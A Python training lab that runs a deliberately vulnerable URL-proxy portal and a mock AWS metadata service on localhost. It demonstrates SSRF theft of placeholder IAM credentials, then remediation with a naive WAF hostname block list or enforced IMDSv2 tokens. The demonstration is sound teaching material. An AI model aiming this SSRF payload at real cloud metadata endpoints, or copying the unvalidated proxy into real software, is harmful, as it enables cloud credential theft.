#!/usr/bin/env python3
import sys
import time
import urllib.request
import urllib.parse
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# Ports configuration
PORTAL_PORT = 8080
IMDS_PORT = 8081

# Mock database for credentials
MOCK_IAM_CREDENTIALS = """{
  "Code" : "Success",
  "LastUpdated" : "2026-07-21T10:45:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "IQoJb3JpZ2luX2VjEOb//////////wEaCXVzLWVhc3QtMSJHMEUCIQ...",
  "Expiration" : "2026-07-21T18:45:00Z"
}"""

class MockIMDSHandler(BaseHTTPRequestHandler):
    """
    Simulates the Instance Metadata Service (IMDS) server.
    Supports both IMDSv1 (legacy, no tokens) and IMDSv2 (tokens required).
    """
    imds_version = 'v1' # Set dynamically during test
    valid_tokens = set()

    def log_message(self, format, *args):
        # Silence default http server printing
        pass

    def do_PUT(self):
        # IMDSv2 Token retrieval path: /latest/api/token
        if self.path == '/latest/api/token':
            # Require token TTL header
            ttl = self.headers.get('X-aws-ec2-metadata-token-ttl-seconds')
            if ttl:
                token = "mock-token-session-xyz-12345"
                self.valid_tokens.add(token)
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(token.encode('utf-8'))
                print("[IMDS SERVER] Token issued successfully to caller.")
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Bad Request: Missing TTL header")
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        print(f"[IMDS SERVER] GET query received for path: {self.path}")
        
        # Check IMDSv2 security
        if self.imds_version == 'v2':
            token = self.headers.get('X-aws-ec2-metadata-token')
            if not token or token not in self.valid_tokens:
                print("\033[91m[IMDS SERVER] Blocked: Request lacked valid IMDSv2 token header!\033[0m")
                self.send_response(401)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"401 - Unauthorized. IMDSv2 token required.")
                return

        if self.path == '/latest/meta-data/iam/security-credentials/admin-role':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(MOCK_IAM_CREDENTIALS.encode('utf-8'))
            print("\033[93m[IMDS SERVER] Warning: Exfiltrating IAM credentials JSON to caller!\033[0m")
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Mock IMDS active. Valid paths: /latest/meta-data/iam/security-credentials/admin-role")


class VulnerablePortalHandler(BaseHTTPRequestHandler):
    """
    Simulates a vulnerable portal web application containing a proxy endpoint.
    It takes an external query parameter 'url' and fetches it.
    """
    waf_enabled = False

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        # Route: /fetch?url=...
        parsed_url = urllib.parse.urlparse(self.path)
        if parsed_url.path == '/fetch':
            query_params = urllib.parse.parse_qs(parsed_url.query)
            target_url = query_params.get('url', [None])[0]
            
            if not target_url:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Missing 'url' parameter.")
                return
                
            print(f"[PORTAL APP] Proxy endpoint received target lookup URL: {target_url}")
            
            # If WAF Remediation is active, block loopback / private ranges
            if self.waf_enabled:
                parsed_target = urllib.parse.urlparse(target_url)
                hostname = parsed_target.hostname or ""
                # Naive WAF pattern blocking localhost and loopbacks
                if hostname in ['localhost', '127.0.0.1', '169.254.169.254']:
                    print("\033[92m[PORTAL APP] WAF Rule Triggered: Blocked access to loopback / local IP ranges.\033[0m")
                    self.send_response(403)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b"403 Forbidden - Access to local endpoints is prohibited.")
                    return

            # Execute Request Proxy (SSRF Vector)
            try:
                # Forward incoming request header if present (mocking header passing)
                req = urllib.request.Request(target_url)
                # Pass through the caller's IMDS token if they included it
                token_val = self.headers.get('X-aws-ec2-metadata-token')
                if token_val:
                    req.add_header('X-aws-ec2-metadata-token', token_val)
                    
                with urllib.request.urlopen(req, timeout=2) as response:
                    content = response.read()
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(content)
            except urllib.error.HTTPError as e:
                self.send_response(e.code)
                self.end_headers()
                self.wfile.write(f"Upstream Server Error: {e.reason}".encode('utf-8'))
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(f"Proxy request failed: {str(e)}".encode('utf-8'))
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Vulnerable App Portal. Proxy Route: /fetch?url=...")

def start_servers(waf_active=False, imds_v2_active=False):
    # Configure handlers
    VulnerablePortalHandler.waf_enabled = waf_active
    MockIMDSHandler.imds_version = 'v2' if imds_v2_active else 'v1'
    
    # Initialize servers
    portal_server = HTTPServer(('localhost', PORTAL_PORT), VulnerablePortalHandler)
    imds_server = HTTPServer(('localhost', IMDS_PORT), MockIMDSHandler)
    
    # Run in daemon threads
    portal_thread = threading.Thread(target=portal_server.serve_forever, daemon=True)
    imds_thread = threading.Thread(target=imds_server.serve_forever, daemon=True)
    
    portal_thread.start()
    imds_thread.start()
    
    return portal_server, imds_server

def run_lab(remediation_level=0):
    """
    remediation_level:
      0 = Vulnerable
      1 = WAF Filtering Enabled
      2 = IMDSv2 Enforced
    """
    waf = (remediation_level == 1)
    imds_v2 = (remediation_level == 2)
    
    print("\n=======================================================")
    print("SSRF-TO-IMDS CREDENTIAL EXFILTRATION LAB")
    if remediation_level == 0:
        print("Profile: VULNERABLE (IMDSv1 & No WAF)")
    elif remediation_level == 1:
        print("Profile: REMEDIATED (WAF URL Validation Guard)")
    elif remediation_level == 2:
        print("Profile: REMEDIATED (IMDSv2 Enforced)")
    print("=======================================================")
    
    print("\nStep 1: Spawning local mock servers...")
    portal_s, imds_s = start_servers(waf, imds_v2)
    time.sleep(0.5) # Allow sockets to bind
    print(f"[*] Vulnerable Portal running at http://localhost:{PORTAL_PORT}/")
    print(f"[*] Mock Instance Metadata Service running at http://localhost:{IMDS_PORT}/")
    
    print("\nStep 2: Attacker executes SSRF payload query...")
    # Injecting local IMDS port in place of 169.254.169.254 to simulate link-local target
    attacker_payload = f"http://localhost:{IMDS_PORT}/latest/meta-data/iam/security-credentials/admin-role"
    exploit_url = f"http://localhost:{PORTAL_PORT}/fetch?url=" + urllib.parse.quote(attacker_payload)
    
    print(f"Attacker requests: {exploit_url}")
    
    try:
        req = urllib.request.Request(exploit_url)
        with urllib.request.urlopen(req, timeout=3) as res:
            data = res.read().decode('utf-8')
            print(f"\nResponse Code: {res.status}")
            print("Response Payload:")
            print(data)
            
            if "AccessKeyId" in data:
                print("\n\033[91m[ALERT] EXPLOIT SUCCESSFUL! IAM Credentials harvested from metadata service.\033[0m")
            else:
                print("\n[STATUS] Credentials not found in response.")
    except urllib.error.HTTPError as e:
        print(f"\nResponse Code: {e.code}")
        print(f"Response Payload:\n{e.read().decode('utf-8')}")
        if e.code == 403:
            print("\n\033[92m[REMEDIATION] Success: SSRF request intercepted and blocked by WAF input sanitation rules.\033[0m")
        elif e.code == 401:
            print("\n\033[92m[REMEDIATION] Success: SSRF bypassed web filters, but the mock IMDS server blocked the request because it did not present an IMDSv2 Session Token.\033[0m")
    except Exception as e:
        print(f"Exploit connection failed: {e}")
        
    print("\nStep 3: Shutting down mock sockets...")
    portal_s.shutdown()
    imds_s.shutdown()
    print("[*] Sockets terminated.")

if __name__ == "__main__":
    level = 0
    if len(sys.argv) > 1:
        if sys.argv[1] == '--remediate-waf':
            level = 1
        elif sys.argv[1] == '--remediate-imds':
            level = 2
    run_lab(level)
